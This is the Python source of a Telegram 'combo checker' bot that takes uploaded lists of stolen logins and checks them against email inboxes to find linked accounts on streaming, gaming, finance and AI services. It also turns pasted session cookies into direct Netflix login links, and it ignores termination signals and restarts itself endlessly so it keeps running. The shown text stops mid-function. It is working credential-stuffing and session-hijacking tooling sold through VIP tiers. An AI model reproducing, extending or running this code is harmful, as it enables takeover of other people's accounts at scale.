"""
PEACE CHECKER TELEGRAM BOT - ULTIMATE VERSION
Created by: @WAKERC
Channel: @peace_giveaway
✅ TikTok Full Capture (VIP Only)
✅ AI Platforms Check (Free)
✅ Ban System
✅ Advanced Statistics
✅ Stop Button
✅ All Previous Features
"""

# ── SELF-RESTART WRAPPER ──────────────────────────────────────────────────────
# When the deployment runs `python main.py`, this outer process becomes a
# permanent manager that loops forever and restarts the real bot process the
# instant it exits — even if killed by SIGKILL or a hard crash.
import os as _os, sys as _sys
if _os.environ.get("_BOT_INNER") != "1":
    import subprocess as _sp, time as _t
    _env = _os.environ.copy()
    _env["_BOT_INNER"] = "1"
    print("🔁 [Manager] Self-restart wrapper active — bot will NEVER stop.")
    while True:
        try:
            _ret = _sp.call([_sys.executable] + _sys.argv, env=_env)
            print(f"🔄 [Manager] Bot exited (code {_ret}) — restarting NOW...")
        except Exception as _e:
            print(f"⚠️  [Manager] Subprocess error: {_e} — restarting NOW...")
# ─────────────────────────────────────────────────────────────────────────────

import telebot
from telebot import types
import sqlite3
import os
import time
import threading
import concurrent.futures
import datetime
import json
import requests
import uuid
import re
import urllib.parse
import random
import imaplib
import email as email_lib
from email.header import decode_header
from pathlib import Path
from io import BytesIO
from translations import t, get_lang, set_lang, load_languages, TRANSLATIONS
from user_stats import record_scan, record_inbox, get_user_stats, get_all_stats, get_top_users, get_global_stats

# TikTok Capture Module
USER_AGENTS_TIKTOK = [
    'Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
]

def format_number(num):
    """Format large numbers"""
    if num >= 1000000:
        return f"{num/1000000:.1f}M"
    elif num >= 1000:
        return f"{num/1000:.1f}K"
    else:
        return str(num)

# Bot Configuration
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_TOKEN_HERE!!!")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0"))
MY_SIGNATURE = "@WAKERC"
CHANNEL = "@peace_giveaway"

# ── Force Join Channel Config ─────────────────────────────────────────────────
_FJ_CONFIG_PATH = "force_join_config.json"

def _load_fj_config():
    try:
        with open(_FJ_CONFIG_PATH, "r") as f:
            raw = json.load(f)
        # ── Migrate old plain-string entries to dicts ──────────────────────
        migrated = []
        changed = False
        for ch in raw.get("channels", []):
            if isinstance(ch, str):
                uname = ch.lstrip("@")
                migrated.append({"id": f"@{uname}", "link": f"https://t.me/{uname}", "display": f"@{uname}"})
                changed = True
            else:
                migrated.append(ch)
        raw["channels"] = migrated
        if changed:
            with open(_FJ_CONFIG_PATH, "w") as f:
                json.dump(raw, f)
        return raw
    except Exception:
        return {"enabled": False, "channels": []}

def _save_fj_config(cfg):
    try:
        with open(_FJ_CONFIG_PATH, "w") as f:
            json.dump(cfg, f)
    except Exception:
        pass

def _parse_fj_channel_input(text):
    """Parse admin input and return a channel dict or None.

    Accepted formats:
      @username          → public channel
      username           → treated as @username
      https://t.me/name  → public channel via link
      -100XXXXXXXXX      → private channel by ID only (no join-button link)
      -100XXXXXXXXX https://t.me/+HASH  → private channel ID + invite link
    """
    text = text.strip()
    # Format: numeric_id invite_link  (e.g. "-1001234567 https://t.me/+abc")
    parts = text.split(None, 1)
    if len(parts) == 2:
        id_part, link_part = parts[0].strip(), parts[1].strip()
        if id_part.lstrip("-").isdigit() and link_part.startswith("https://t.me/"):
            return {"id": int(id_part), "link": link_part, "display": f"ID {id_part}"}
    # Format: https://t.me/username  (public)
    if text.startswith("https://t.me/"):
        tail = text[len("https://t.me/"):].rstrip("/")
        if not tail.startswith("+"):
            return {"id": f"@{tail}", "link": text, "display": f"@{tail}"}
        # Invite link without an ID — cannot verify membership, reject
        return None
    # Format: -100XXXXXXXXX  (numeric only, no join link)
    if text.lstrip("-").isdigit():
        return {"id": int(text), "link": None, "display": f"ID {text}"}
    # Format: @username or plain username
    uname = text.lstrip("@")
    if uname:
        return {"id": f"@{uname}", "link": f"https://t.me/{uname}", "display": f"@{uname}"}
    return None

def _fj_join_markup(missing_channels):
    """Build an InlineKeyboardMarkup with join buttons for missing channels."""
    markup = types.InlineKeyboardMarkup(row_width=1)
    for ch in missing_channels:
        link = ch.get("link")
        label = ch.get("display", "Channel")
        if link:
            markup.add(types.InlineKeyboardButton(f"📢 Join {label}", url=link))
        else:
            markup.add(types.InlineKeyboardButton(f"📢 {label} (search manually)", callback_data="fj_no_link"))
    markup.add(types.InlineKeyboardButton("✅ I Joined", callback_data="fj_check"))
    return markup

_fj_config = _load_fj_config()

def check_force_join(user_id):
    """Return list of channel dicts the user has NOT joined yet (empty = all joined)."""
    if not _fj_config.get("enabled"):
        return []
    if user_id == ADMIN_ID:
        return []
    missing = []
    for ch in _fj_config.get("channels", []):
        ch_id = ch.get("id") if isinstance(ch, dict) else ch
        try:
            member = bot.get_chat_member(ch_id, user_id)
            if member.status in ("left", "kicked", "banned"):
                missing.append(ch)
        except Exception:
            missing.append(ch)
    return missing

bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=150)

# ── Never-stop: auto-retry all Telegram API errors instantly ─────────────
import telebot.apihelper as _api
_api.RETRY_ON_ERROR = True
_api.RETRY_TIMEOUT = 0          # no wait between retries
_api.MAX_RETRIES = 999999       # effectively infinite
_api.SESSION_TIME_TO_LIVE = 60      # refresh session every 1 min

# ── Global socket timeout: generous enough for Telegram API calls ──────────
import socket as _socket
_socket.setdefaulttimeout(20)

# ── Ignore SIGTERM so only SIGKILL can actually stop the process ─────────
import signal as _signal
def _ignore(*_): pass
try:
    _signal.signal(_signal.SIGTERM, _ignore)
    _signal.signal(_signal.SIGHUP, _ignore)
except Exception:
    pass

user_sessions = {}
active_scans = {}
maintenance_mode = False

# ── Global HTTP connection pool for maximum speed ─────────────────────────
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry as _Retry
_pool_adapter = HTTPAdapter(
    pool_connections=500,
    pool_maxsize=1000,
    max_retries=_Retry(total=0, raise_on_status=False)
)
_global_http = requests.Session()
_global_http.mount("https://", _pool_adapter)
_global_http.mount("http://", _pool_adapter)

# ── Scan state persistence (for auto-resume after restart) ────────────────
SCAN_STATE_FILE = "scan_resume_state.json"

def save_scan_state(user_id, chat_id, remaining_lines, scan_mode, state_dict, custom_domain="", is_group_scan=False):
    try:
        resume_file = f"scan_resume_{user_id}.txt"
        with open(resume_file, 'w', encoding='utf-8') as f:
            f.write('\n'.join(remaining_lines))
        payload = {
            "user_id": user_id, "chat_id": chat_id,
            "resume_file": resume_file,
            "remaining": len(remaining_lines),
            "scan_mode": scan_mode,
            "custom_domain": custom_domain,
            "is_group_scan": is_group_scan,
            "hits_done": state_dict.get('hits', 0),
            "all_hits": state_dict.get('all_hits', []),
            "timestamp": datetime.datetime.now().isoformat()
        }
        try:
            with open(SCAN_STATE_FILE, 'r') as f:
                all_states = json.load(f)
        except Exception:
            all_states = {}
        all_states[str(user_id)] = payload
        with open(SCAN_STATE_FILE, 'w') as f:
            json.dump(all_states, f, indent=2)
    except Exception as e:
        print(f"[ScanState] Save error: {e}")

def clear_scan_state(user_id):
    try:
        resume_file = f"scan_resume_{user_id}.txt"
        if os.path.exists(resume_file):
            os.remove(resume_file)
        try:
            with open(SCAN_STATE_FILE, 'r') as f:
                all_states = json.load(f)
        except Exception:
            all_states = {}
        all_states.pop(str(user_id), None)
        with open(SCAN_STATE_FILE, 'w') as f:
            json.dump(all_states, f, indent=2)
    except Exception as e:
        print(f"[ScanState] Clear error: {e}")

def load_all_scan_states():
    try:
        if not os.path.exists(SCAN_STATE_FILE):
            return {}
        with open(SCAN_STATE_FILE, 'r') as f:
            return json.load(f)
    except Exception:
        return {}

import queue

# ── Cookie Login System ────────────────────────────────────────────────────
_COOKIE_SESSIONS_FILE = "_cookie_sessions.json"
_cookie_sessions_lock = threading.Lock()
_BOT_WEB_BASE = "https://" + os.environ.get("REPLIT_DOMAINS", os.environ.get("REPLIT_DEV_DOMAIN", "localhost:5000"))

def _save_cookie_session(token, service, cookies_list):
    try:
        with _cookie_sessions_lock:
            data = {}
            if os.path.exists(_COOKIE_SESSIONS_FILE):
                try:
                    with open(_COOKIE_SESSIONS_FILE, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                except Exception:
                    data = {}
            data[token] = {"service": service, "cookies": cookies_list, "created": time.time()}
            with open(_COOKIE_SESSIONS_FILE, 'w', encoding='utf-8') as f:
                json.dump(data, f)
    except Exception:
        pass

def _parse_cookies(raw_text):
    """Parse cookies from Netscape, JSON array, or name=value; format."""
    raw_text = raw_text.strip()
    result = []
    # Try JSON array
    if raw_text.startswith('['):
        try:
            items = json.loads(raw_text)
            for item in items:
                if isinstance(item, dict) and item.get('name'):
                    result.append({
                        "name": str(item.get("name", "")),
                        "value": str(item.get("value", "")),
                        "domain": str(item.get("domain", "")),
                        "path": str(item.get("path", "/")),
                        "secure": bool(item.get("secure", False)),
                    })
            return result
        except Exception:
            pass
    # Try Netscape format (tab-separated)
    if '# Netscape HTTP Cookie File' in raw_text or '\t' in raw_text:
        for line in raw_text.splitlines():
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            parts = line.split('\t')
            if len(parts) >= 7:
                result.append({
                    "name": parts[5], "value": parts[6],
                    "domain": parts[0], "path": parts[2],
                    "secure": parts[3].upper() == 'TRUE',
                })
        if result:
            return result
    # Try name=value; format
    for part in raw_text.split(';'):
        part = part.strip()
        if '=' in part:
            name, _, value = part.partition('=')
            name = name.strip()
            value = value.strip()
            if name:
                result.append({"name": name, "value": value, "domain": "", "path": "/", "secure": False})
    return result

def _extract_netflix_nftoken(cookies_list):
    """Extract nftoken from NetflixId cookie for direct browser login.
    NetflixId value (URL-decoded) looks like: ct=<BASE64>&ch=...&v=3&pg=...
    The nftoken is the value of the ct= parameter.
    Returns the direct login URL or None if NetflixId not found."""
    try:
        from urllib.parse import unquote, parse_qs
        for c in cookies_list:
            if c.get("name", "").lower() in ("netflixid", "netflix_id"):
                raw_val = c.get("value", "")
                decoded = unquote(raw_val)
                # decoded looks like: ct=TOKENVALUE&ch=...&v=3&pg=...
                if decoded.startswith("ct="):
                    # Extract just the ct value (before &ch= or end)
                    ct_val = decoded[3:]  # strip leading "ct="
                    amp = ct_val.find("&")
                    if amp != -1:
                        ct_val = ct_val[:amp]
                    if ct_val:
                        return "https://www.netflix.com/login?nftoken=" + ct_val
                # Fallback: use raw value directly as nftoken
                if raw_val:
                    return "https://www.netflix.com/login?nftoken=" + raw_val
    except Exception:
        pass
    return None

# ──────────────────────────────────────────────────────────────────────────

_db_lock = threading.Lock()
_scan_lock = threading.Lock()

def get_db():
    conn = sqlite3.connect('bot_database.db', check_same_thread=False, timeout=30)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=5000")
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.execute("PRAGMA cache_size=-32768")
    conn.execute("PRAGMA temp_store=MEMORY")
    return conn

def safe_send(chat_id, text, **kwargs):
    for attempt in range(3):
        try:
            return bot.send_message(chat_id, text, **kwargs)
        except telebot.apihelper.ApiTelegramException as e:
            if e.error_code == 429:
                retry = int(e.result_json.get('parameters', {}).get('retry_after', 3))
                time.sleep(retry)
            else:
                raise
        except Exception:
            if attempt < 2:
                time.sleep(1)
            else:
                raise

TG_MAX_BYTES = 45 * 1024 * 1024  # 45 MB — safe limit under Telegram's 50 MB cap

def send_large_document(chat_id, data_bytes, filename, caption="", parse_mode='HTML'):
    """Send a file to Telegram, auto-splitting into 45 MB parts if needed."""
    if isinstance(data_bytes, str):
        data_bytes = data_bytes.encode('utf-8')

    if len(data_bytes) <= TG_MAX_BYTES:
        file_obj = BytesIO(data_bytes)
        file_obj.name = filename
        bot.send_document(chat_id, file_obj, caption=caption or None, parse_mode=parse_mode if caption else None)
        return

    chunks = [data_bytes[i:i + TG_MAX_BYTES] for i in range(0, len(data_bytes), TG_MAX_BYTES)]
    total_parts = len(chunks)
    base_name, ext = filename.rsplit('.', 1) if '.' in filename else (filename, 'txt')
    bot.send_message(chat_id,
                     f"⚠️ <b>File too large for one message!</b>\n\nSplitting into <b>{total_parts} parts</b>...",
                     parse_mode='HTML')
    for idx, chunk in enumerate(chunks, 1):
        part_filename = f"{base_name}_Part{idx}of{total_parts}.{ext}"
        part_caption = f"📄 Part {idx}/{total_parts}" + (f"\n{caption}" if idx == total_parts and caption else "")
        file_obj = BytesIO(chunk)
        file_obj.name = part_filename
        bot.send_document(chat_id, file_obj, caption=part_caption, parse_mode='HTML')
        time.sleep(0.3)


def _download_combo(message):
    """
    Download a combo file sent by the user.
    - Files up to 20 MB  : downloaded via the standard Bot API.
    - Files 20 MB – 50 MB: streamed directly from Telegram's CDN.
    - Files > 50 MB      : returns None and sends a split-file instruction.
    Returns raw bytes or None on failure.
    """
    import requests as _req
    doc = message.document
    file_size = getattr(doc, 'file_size', 0) or 0
    HARD_LIMIT = 50 * 1024 * 1024   # 50 MB absolute cap per part

    if file_size > HARD_LIMIT:
        size_mb = file_size // (1024 * 1024)
        bot.send_message(
            message.chat.id,
            f"⚠️ <b>File too large ({size_mb} MB)</b>\n\n"
            f"Telegram allows bots to receive files up to <b>50 MB</b> per part.\n\n"
            f"📋 <b>How to send a large combo:</b>\n"
            f"• Split your file into parts of <b>≤ 20 MB</b> each\n"
            f"• Send each part one by one — the bot <b>auto-merges</b> them\n"
            f"• After sending all parts, the scan starts automatically\n\n"
            f"💡 Use tools like <code>split -l 200000 combo.txt part_</code> on Linux\n"
            f"or 7-Zip / WinRAR on Windows to split large files.\n\n"
            f"💎 {MY_SIGNATURE}",
            parse_mode='HTML'
        )
        return None

    # Try standard Bot API (works up to 20 MB)
    try:
        file_info = bot.get_file(doc.file_id)
        return bot.download_file(file_info.file_path)
    except Exception as e:
        err = str(e).lower()
        if 'file is too big' not in err and 'too big' not in err:
            raise  # different error — re-raise

    # Bot API rejected it (20–50 MB range) — stream directly from CDN
    try:
        bot_token = bot.token
        file_info = bot.get_file(doc.file_id)
        url = f"https://api.telegram.org/file/bot{bot_token}/{file_info.file_path}"
        resp = _req.get(url, stream=True, timeout=120)
        resp.raise_for_status()
        chunks_list = []
        for chunk in resp.iter_content(chunk_size=1024 * 1024):
            if chunk:
                chunks_list.append(chunk)
        return b"".join(chunks_list)
    except Exception:
        pass

    # Final fallback — inform user
    bot.send_message(
        message.chat.id,
        f"⚠️ <b>File too large to download</b>\n\n"
        f"Please split your combo into parts of <b>≤ 20 MB</b> each and send them one by one.\n"
        f"The bot will <b>auto-merge</b> all parts before scanning.\n\n"
        f"💎 {MY_SIGNATURE}",
        parse_mode='HTML'
    )
    return None

def start_scan(user_id):
    with _scan_lock:
        if active_scans.get(user_id, False):
            return False
        active_scans[user_id] = True
        return True

def stop_scan(user_id):
    with _scan_lock:
        active_scans[user_id] = False

def end_scan(user_id):
    with _scan_lock:
        active_scans.pop(user_id, None)

# ── GROUP SUPPORT ──────────────────────────────────────────
ALLOWED_GROUPS_FILE = "allowed_groups.json"

def load_allowed_groups():
    try:
        with open(ALLOWED_GROUPS_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

def save_allowed_groups(groups):
    with open(ALLOWED_GROUPS_FILE, 'w') as f:
        json.dump(groups, f)

def is_allowed_group(chat_id):
    return chat_id in load_allowed_groups()

def add_allowed_group(chat_id):
    groups = load_allowed_groups()
    if chat_id not in groups:
        groups.append(chat_id)
        save_allowed_groups(groups)

def remove_allowed_group(chat_id):
    groups = load_allowed_groups()
    if chat_id in groups:
        groups.remove(chat_id)
        save_allowed_groups(groups)

def is_group_chat(message):
    return message.chat.type in ("group", "supergroup")

# ── IP / USER LOGGING ─────────────────────────────────────
USER_LOG_FILE = "user_log.json"

_activity_log_lock = threading.Lock()

def _log_user_activity_worker(user_id, username, action, chat_type, chat_id, lang_code):
    try:
        with _activity_log_lock:
            try:
                with open(USER_LOG_FILE, 'r') as f:
                    logs = json.load(f)
            except Exception:
                logs = {}
            uid = str(user_id)
            if uid not in logs:
                logs[uid] = {"username": username, "actions": [], "devices": []}
            logs[uid]["username"] = username
            device_info = None
            if lang_code:
                device_info = f"lang:{lang_code}"
                if device_info not in logs[uid]["devices"]:
                    logs[uid]["devices"].append(device_info)
            entry = {
                "action": action,
                "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "chat_type": chat_type,
                "chat_id": chat_id,
            }
            if device_info:
                entry["device"] = device_info
            logs[uid]["actions"] = logs[uid]["actions"][-49:]
            logs[uid]["actions"].append(entry)
            with open(USER_LOG_FILE, 'w') as f:
                json.dump(logs, f, indent=2)
    except Exception:
        pass

def log_user_activity(user_id, username, action, message=None):
    try:
        chat_type = message.chat.type if message else "unknown"
        chat_id = message.chat.id if message else None
        lang_code = (message.from_user.language_code if message and hasattr(message, 'from_user') and message.from_user else None) or ""
        threading.Thread(
            target=_log_user_activity_worker,
            args=(user_id, username, action, chat_type, chat_id, lang_code),
            daemon=True
        ).start()
    except Exception:
        pass

def get_user_log(user_id):
    try:
        with open(USER_LOG_FILE, 'r') as f:
            logs = json.load(f)
        return logs.get(str(user_id), None)
    except:
        return None

def get_all_user_logs():
    try:
        with open(USER_LOG_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

# Services Configuration
SERVICES_ALL = {
    # Social Media
    "Reddit": "Reddit",
    "Instagram": "security@mail.instagram.com",
    "TikTok": "register@account.tiktok.com",
    "Twitter": "info@x.com",
    "LinkedIn": "security-noreply@linkedin.com",
    "Snapchat": "no-reply@accounts.snapchat.com",

    # Streaming
    "Netflix": "info@account.netflix.com",
    "Spotify": "no-reply@spotify.com",
    "Disney+": "no-reply@disneyplus.com",
    "Hulu": "account@hulu.com",
    "YouTube": "no-reply@youtube.com",

    # Gaming
    "Steam": "noreply@steampowered.com",
    "Xbox": "xboxreps@engage.xbox.com",
    "PlayStation": "reply@txn-email.playstation.com",
    "Epic Games": "help@acct.epicgames.com",
    "Roblox": "accounts@roblox.com",
    "Free Fire": "no-reply@garena.com",
    "PUBG Mobile": "noreply@pubgmobile.com",
    "Konami": "noreply@konami.net",

    # Finance
    "PayPal": "service@paypal.com.br",
    "Binance": "do-not-reply@ses.binance.com",
    "Coinbase": "no-reply@coinbase.com",

    # Shopping
    "Shein": "noreply@sheinnotice.com",
    "Limehome": "Limehome.com",
    "Check24": "Check24",
    "Lime": "no-reply@li.me",
}

SERVICES_GAMING = {
    "Steam": "noreply@steampowered.com",
    "Xbox": "xboxreps@engage.xbox.com",
    "PlayStation": "reply@txn-email.playstation.com",
    "Epic Games": "help@acct.epicgames.com",
    "EA Sports": "EA@e.ea.com",
    "Ubisoft": "noreply@ubisoft.com",
    "Riot Games": "no-reply@riotgames.com",
    "Roblox": "accounts@roblox.com",
    "Minecraft": "noreply@mojang.com",
    "Free Fire": "no-reply@garena.com",
    "PUBG Mobile": "noreply@pubgmobile.com",
    "Konami": "noreply@konami.net",
}

SERVICES_SOCIAL = {
    "Facebook": "security@facebookmail.com",
    "Instagram": "security@mail.instagram.com",
    "TikTok": "register@account.tiktok.com",
    "Twitter": "info@x.com",
    "LinkedIn": "security-noreply@linkedin.com",
    "Snapchat": "no-reply@accounts.snapchat.com",
    "Discord": "noreply@discord.com",
}

SERVICES_STREAMING = {
    "Netflix": "info@account.netflix.com",
    "Spotify": "no-reply@spotify.com",
    "Disney+": "no-reply@disneyplus.com",
    "Hulu": "account@hulu.com",
    "HBO Max": "no-reply@hbomax.com",
    "Amazon Prime": "auto-confirm@amazon.com",
    "YouTube": "no-reply@youtube.com",
    "Twitch": "no-reply@twitch.tv",
}

# AI Platforms (Free for everyone)
SERVICES_AI = {
    "ChatGPT": "support@openai.com",
    "Claude AI": "support@anthropic.com",
    "Gemini": "ai-support@google.com",
    "DeepSeek": "support@deepseek.com",
    "Blackbox AI": "support@blackbox.ai",
    "Perplexity": "support@perplexity.ai",
    "Meta AI": "ai@meta.com",
    "Copilot": "copilot@microsoft.com",
    "Stability AI": "support@stability.ai",
}

# Shopping Platforms
SERVICES_SHOPPING = {
    "Shein": "noreply@sheinnotice.com",
    "Limehome": "Limehome.com",
    "Check24": "Check24",
    "Lime": "no-reply@li.me",
}

# Database Setup
def init_db():
    conn = sqlite3.connect('bot_database.db', check_same_thread=False, timeout=30)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=5000")
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.execute("PRAGMA cache_size=-32768")
    conn.execute("PRAGMA temp_store=MEMORY")
    c = conn.cursor()

    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        is_vip INTEGER DEFAULT 0,
        vip_until TEXT,
        is_banned INTEGER DEFAULT 0,
        ban_reason TEXT,
        referral_code TEXT UNIQUE,
        referred_by INTEGER,
        referrals_count INTEGER DEFAULT 0,
        last_scan_time TEXT,
        total_scans INTEGER DEFAULT 0,
        total_hits INTEGER DEFAULT 0,
        join_date TEXT,
        trial_used INTEGER DEFAULT 0
    )''')

    try:
        c.execute("ALTER TABLE users ADD COLUMN trial_used INTEGER DEFAULT 0")
    except:
        pass

    # Scans history
    c.execute('''CREATE TABLE IF NOT EXISTS scans (
        scan_id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        scan_date TEXT,
        scan_mode TEXT,
        hits_count INTEGER,
        bad_count INTEGER,
        total_checked INTEGER
    )''')

    conn.commit()
    conn.close()

init_db()

# Database Helper Functions
def get_user(user_id):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def add_user(user_id, username):
    conn = get_db()
    c = conn.cursor()

    user = get_user(user_id)
    if not user:
        # Generate unique referral code
        referral_code = f"REF{user_id}"
        c.execute("""INSERT INTO users (user_id, username, referral_code, join_date) 
                     VALUES (?, ?, ?, ?)""", 
                  (user_id, username, referral_code, str(datetime.datetime.now())))
        conn.commit()
    conn.close()

def add_vip_hours(user_id, hours):
    """Add VIP hours (for referral system)"""
    conn = get_db()
    c = conn.cursor()

    user = get_user(user_id)
    if not user:
        return False

    current_vip = user[3]  # vip_until
    now = datetime.datetime.now()

    if current_vip == "Forever":
        new_vip = "Forever"
    elif current_vip:
        try:
            vip_date = datetime.datetime.strptime(current_vip, "%Y-%m-%d %H:%M:%S")
            if vip_date > now:
                # Extend existing VIP
                new_vip = vip_date + datetime.timedelta(hours=hours)
            else:
                # VIP expired, start new
                new_vip = now + datetime.timedelta(hours=hours)
        except Exception as e:
            print(f"[AddVIP] Error parsing VIP date for user {user_id}: {e}")
            new_vip = now + datetime.timedelta(hours=hours)
    else:
        # No VIP, start new
        new_vip = now + datetime.timedelta(hours=hours)

    vip_str = new_vip if new_vip == "Forever" else new_vip.strftime("%Y-%m-%d %H:%M:%S")
    c.execute("UPDATE users SET is_vip = 1, vip_until = ? WHERE user_id = ?", 
              (vip_str, user_id))
    conn.commit()
    conn.close()
    try:
        membership = "Forever" if new_vip == "Forever" else "VIP"
        update_json_user(user_id, is_vip=True, vip_until=vip_str, membership=membership)
    except Exception:
        pass
    return True

def process_referral(new_user_id, referrer_user_id):
    """Process referral - Tiered VIP rewards"""
    if referrer_user_id == new_user_id:
        return False, "", ""

    conn = get_db()
    c = conn.cursor()

    new_user = get_user(new_user_id)
    if new_user and new_user[7]:
        conn.close()
        return False, "", ""

    c.execute("UPDATE users SET referred_by = ? WHERE user_id = ?",
              (referrer_user_id, new_user_id))
    c.execute("UPDATE users SET referrals_count = referrals_count + 1 WHERE user_id = ?",
              (referrer_user_id,))
    conn.commit()

    c.execute("SELECT referrals_count FROM users WHERE user_id = ?", (referrer_user_id,))
    row = c.fetchone()
    conn.close()

    ref_count = row[0] if row else 1

    # Tiered hourly reward
    if ref_count <= 3:
        hours = 6
        reward_text = "+6 Stunden VIP"
    elif ref_count <= 9:
        hours = 12
        reward_text = "+12 Stunden VIP"
    else:
        hours = 24
        reward_text = "+24 Stunden VIP"

    add_vip_hours(referrer_user_id, hours)

    # Milestone bonuses
    milestone_msg = ""
    if ref_count == 5:
        add_vip(referrer_user_id, "milestone", "3d")
        milestone_msg = "\n\n🏆 <b>MILESTONE!</b> 5 Referrals → +3 Tage Bonus!"
    elif ref_count == 10:
        add_vip(referrer_user_id, "milestone", "1w")
        milestone_msg = "\n\n🏆 <b>MILESTONE!</b> 10 Referrals → +1 Woche Bonus!"
    elif ref_count == 20:
        add_vip(referrer_user_id, "milestone", "1m")
        milestone_msg = "\n\n🏆 <b>MILESTONE!</b> 20 Referrals → +1 Monat Bonus!"

    return True, reward_text, milestone_msg

_banned_cache = {}   # user_id -> (bool, expires_ts)
_banned_cache_lock = threading.Lock()

def is_banned(user_id):
    """Check if user is banned (checks both SQLite and JSON) with 60s cache."""
    if user_id == ADMIN_ID:
        return False
    now = time.time()
    with _banned_cache_lock:
        if user_id in _banned_cache:
            val, exp = _banned_cache[user_id]
            if now < exp:
                return val
    user = get_user(user_id)
    result = False
    if user and user[4] == 1:
        result = True
    if not result:
        try:
            json_user = get_json_user(user_id)
            if json_user and json_user.get('is_banned'):
                result = True
        except Exception:
            pass
    with _banned_cache_lock:
        _banned_cache[user_id] = (result, now + 60)
    return result

def ban_user(user_id, reason="No reason provided"):
    """Ban a user (updates both SQLite and JSON)"""
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 1, ban_reason = ? WHERE user_id = ?", 
              (reason, user_id))
    conn.commit()
    conn.close()
    invalidate_vip_cache(user_id)
    try:
        update_json_user(user_id, is_banned=True)
    except Exception:
        pass

def unban_user(user_id):
    """Unban a user (updates both SQLite and JSON)"""
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 0, ban_reason = NULL WHERE user_id = ?", 
              (user_id,))
    conn.commit()
    conn.close()
    invalidate_vip_cache(user_id)
    try:
        update_json_user(user_id, is_banned=False)
    except Exception:
        pass

def get_banned_users():
    """Get list of banned users"""
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT user_id, username, ban_reason FROM users WHERE is_banned = 1")
    banned = c.fetchall()
    conn.close()
    return banned

_vip_cache = {}   # user_id -> (bool, expires_ts)
_vip_cache_lock = threading.Lock()

def invalidate_vip_cache(user_id):
    """Call this when VIP status changes so cache is cleared immediately."""
    with _vip_cache_lock:
        _vip_cache.pop(user_id, None)
    with _banned_cache_lock:
        _banned_cache.pop(user_id, None)

def is_vip(user_id):
    """Check if user is VIP (checks both SQLite and JSON) with 60s cache."""
    if user_id == ADMIN_ID:
        return True
    now = time.time()
    with _vip_cache_lock:
        if user_id in _vip_cache:
            val, exp = _vip_cache[user_id]
            if now < exp:
                return val

    # Check SQLite first
    user = get_user(user_id)
    if user:
        is_vip_flag = user[2]
        vip_until = user[3]

        if is_vip_flag and is_vip_flag != 0:
            if vip_until == "Forever":
                with _vip_cache_lock:
                    _vip_cache[user_id] = (True, time.time() + 3600)
                return True
            if vip_until and vip_until.strip():
                try:
                    vip_str = vip_until.strip()
                    vip_date = None
                    for fmt in ("%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M:%S.%f"):
                        try:
                            vip_date = datetime.datetime.strptime(vip_str, fmt)
                            break
                        except ValueError:
                            continue
                    if vip_date and datetime.datetime.now() < vip_date:
                        with _vip_cache_lock:
                            _vip_cache[user_id] = (True, time.time() + 60)
                        return True
                    else:
                        conn = get_db()
                        c = conn.cursor()
                        c.execute("UPDATE users SET is_vip = 0 WHERE user_id = ?", (user_id,))
                        conn.commit()
                        conn.close()
                        try:
                            update_json_user(user_id, is_vip=False, vip_until=None, membership="Free")
                        except Exception:
                            pass
                except Exception:
                    pass
            else:
                conn = get_db()
                c = conn.cursor()
                c.execute("UPDATE users SET is_vip = 0 WHERE user_id = ?", (user_id,))
                conn.commit()
                conn.close()
                try:
                    update_json_user(user_id, is_vip=False, vip_until=None, membership="Free")
                except Exception:
                    pass

    # Also check JSON database
    try:
        json_user = get_json_user(user_id)
        if json_user:
            if json_user.get('is_vip'):
                jvip_until = json_user.get('vip_until')
                if jvip_until == "Forever":
                    with _vip_cache_lock:
                        _vip_cache[user_id] = (True, time.time() + 3600)
                    return True
                if jvip_until:
                    try:
                        jvip_str = str(jvip_until).strip()
                        vip_date = None
                        for fmt in ("%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M:%S.%f"):
                            try:
                                vip_date = datetime.datetime.strptime(jvip_str, fmt)
                                break
                            except ValueError:
                                continue
                        if vip_date and datetime.datetime.now() < vip_date:
                            with _vip_cache_lock:
                                _vip_cache[user_id] = (True, time.time() + 60)
                            return True
                    except Exception:
                        pass
            if json_user.get('membership') == 'Forever':
                with _vip_cache_lock:
                    _vip_cache[user_id] = (True, time.time() + 3600)
                return True
    except Exception:
        pass

    with _vip_cache_lock:
        _vip_cache[user_id] = (False, time.time() + 60)
    return False

def is_vip_forever(user_id):
    """Check if user has FOREVER VIP (for TikTok Full Capture)"""
    if user_id == ADMIN_ID:
        return True

    user = get_user(user_id)
    if not user:
        return False

    vip_until = user[3]
    return vip_until == "Forever"

def can_scan(user_id):
    """Check if user can scan"""
    if is_vip(user_id):
        return True, None

    user = get_user(user_id)
    if not user or not user[6]:  # last_scan_time
        return True, None

    try:
